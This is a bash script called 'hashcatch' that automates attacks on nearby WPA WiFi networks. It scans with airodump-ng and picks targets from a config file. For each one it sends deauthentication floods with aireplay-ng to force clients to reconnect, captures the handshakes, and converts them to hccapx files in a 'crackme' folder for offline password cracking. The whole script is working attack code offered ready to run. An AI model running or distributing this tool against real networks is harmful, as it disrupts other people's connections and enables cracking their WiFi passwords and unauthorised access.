#!/bin/bash

trap ctrl_c INT

RED='\033[0;31m'
LBLUE='\033[1;34m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
NC='\033[0m'

f_config="./hashcatch.conf"
d_handshakes="./crackme/"

ctrl_c(){
	echo -en "\033[2K"
	echo -en "\n\r${YELLOW}[*] Keyboard Interrupt${NC}"
	echo -e "\033[K"
	echo -e "\r${LBLUE}[*] Handshakes captured this session: $hs_count${NC}"
	rm -r /tmp/hc_* &> /dev/null
	tput cnorm
	kill $! &> /dev/null
	exit 0
}

banner(){
	echo -e "${RED}"
	echo " __   __  _______  _______  __   __  _______  _______  _______  _______  __   __ "; 
	echo "|  | |  ||   _   ||       ||  | |  ||       ||   _   ||       ||       ||  | |  |";
	echo "|  |_|  ||  |_|  ||  _____||  |_|  ||       ||  |_|  ||_     _||       ||  |_|  |"; 
	echo "|       ||       || |_____ |       ||       ||       |  |   |  |       ||       |"; 
	echo "|       ||       ||_____  ||       ||      _||       |  |   |  |      _||       |"; 
	echo "|   _   ||   _   | _____| ||   _   ||     |_ |   _   |  |   |  |     |_ |   _   |"; 
	echo "|__| |__||__| |__||_______||__| |__||_______||__| |__|  |___|  |_______||__| |__|"; 
  echo "fix version"
	echo -en "\n${NC}"
}

spin(){
        echo -en "/"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "-"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "\\"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "|"
        sleep 0.1
        echo -en "\033[1D"
}

hc_help(){
	banner
	echo -e "Start hashcatch:"
	echo -e "\tsudo ./hashcatch"
	echo -e "Arguments:"
	echo -e "\t./hashcatch --help  - Print this help screen\n"
}

hc_run(){
	interface=`grep -i 'interface' $f_config | awk -F'=' '{print $2}'`
	
	if [ "$EUID" -ne 0 ]
	then
		echo -e "[-] Requires root permission. Exiting!"
		exit 0
	elif [ ! `grep -i "interface" $f_config | awk -F'=' '{print $2}'` ]
	then
		echo -e "[-] Interface not mentioned in config file."
		exit 0
	fi

	if [ ! -d "$d_handshakes" ];then
		mkdir "$d_handshakes"
    	fi
     
	tput civis
	
	banner

	rm -r /tmp/hc_* &> /dev/null

	echo -en "\033[3B"

	hs_count=0

	while true
	do
		ap_count=0

		echo -en "\033[3A"
		echo -en "\033[2K"
		echo -en "\rStatus: ${YELLOW}Scanning for WiFi networks${NC}"
		echo -en "\033[2C"
		while [ true ]; do echo -en "${YELLOW}"; spin; echo -en "${NC}"; done &
		timeout --foreground 60s airodump-ng "$interface" -t wpa -w /tmp/hc_out --output-format csv &> /dev/null
		echo -en "${NC}"
		kill $! &> /dev/null
		echo -en "\033[1B"
		echo -en "\033[2K"
		echo -en "\033[2B"
		echo -en "\r"

		echo "[*] Reading stations"
		while read -r line; do bssid=$(echo $line | awk -F ',' '{print $1}'); essid=$(echo $line | awk -F',' '{print $14}'); channel=$(echo $line | awk -F',' '{print $4}'); echo $bssid,$essid,$channel; done < /tmp/hc_out-01.csv | grep -iE "([0-9A-F]{2}[:-]){5}([0-9A-F]{2}), [-a-zA-Z0-9_ !]+, ([0-9]{1,2})" > /tmp/hc_stations.tmp

		echo "[*] Clearing temp files"
		rm /tmp/hc_out*

		readarray stations < /tmp/hc_stations.tmp

		mkdir /tmp/hc_captures &> /dev/null
		mkdir /tmp/hc_handshakes &> /dev/null

		for station in "${stations[@]}"
		do
			bssid=`echo "$station" | awk -F',' '{print $1}' | sed -e 's/^[" "]*//'`
			essid=`echo "$station" | awk -F',' '{print $2}' | sed -e 's/^[" "]*//'`
			if [ -s "$d_handshakes$bssid-$essid" ]; then
				continue
			fi
			channel=`echo "$station" | awk -F',' '{print $3}' | sed -e 's/^[" "]*//'`
   			if [[ ! "`grep -i 'focus' $f_config | awk -F'=' '{print $2}'`" == *"$essid"* ]]
			then
				continue
			fi
			((ap_count++))
			echo -en "\033[2A"
			echo -en "\033[2K"
			echo -en "\rAccess Point: ${YELLOW}$essid${NC}"
			echo -en "\033[2B"
			echo -en "\033[3A"
			echo -en "\033[2K"
			echo -en "\rStatus: ${YELLOW}Deauthenticating clients${NC}"
			echo -en "\033[3B"
			echo -en "\r"
			iwconfig "$interface" channel "$channel"
			aireplay-ng --deauth 50 -a "$bssid" "$interface" &> /dev/null &
			sleep 1
			echo -en "\033[3A"
			echo -en "\033[2K"
			echo -en "\rStatus: ${YELLOW}Listening for handshake${NC}"
			while [ true ]; do echo -en "${YELLOW}"; spin; echo -en "${NC}"; done &
			echo -en "\033[2C"
			timeout --foreground 60s airodump-ng -w "/tmp/hc_captures/$bssid" --bssid "$bssid" --channel "$channel" "$interface" &> /dev/null
			echo -en "${NC}"
			kill $! &> /dev/null
			echo -en "\033[3B"
			echo -en "\r"
			handshake_file="/tmp/hc_captures/$bssid.hccapx"
			cap2hccapx "/tmp/hc_captures/$bssid-01.cap" $handshake_file
			if [ -s $handshake_file ]
			then
				cp $handshake_file "$d_handshakes/${bssid}-${essid}.hccapx" 
				((hs_count++))
			fi
			rm /tmp/hc_captures/$bssid*
		done

		if [[ $ap_count == 0 ]]
		then
			echo -en "\033[1A"
			echo -en "\033[2K"
			echo -en "\rLast scan: ${YELLOW}Pwned all nearby WiFi networks${NC}"
			echo -en "\033[1B"
			echo -en "\r"
		else
			echo -en "\033[1A"
			echo -en "\033[2K"
			echo -en "\rLast scan: ${YELLOW}`ls /tmp/hc_handshakes/ | wc -l` new handshakes captured${NC}"
			echo -en "\033[1B"
			echo -en "\r"
		fi
	done
}

if [[ $1 == "--help" ]]
then
	hc_help
elif [[ $1 == "" ]]
then
	hc_run
else
	hc_help
fi
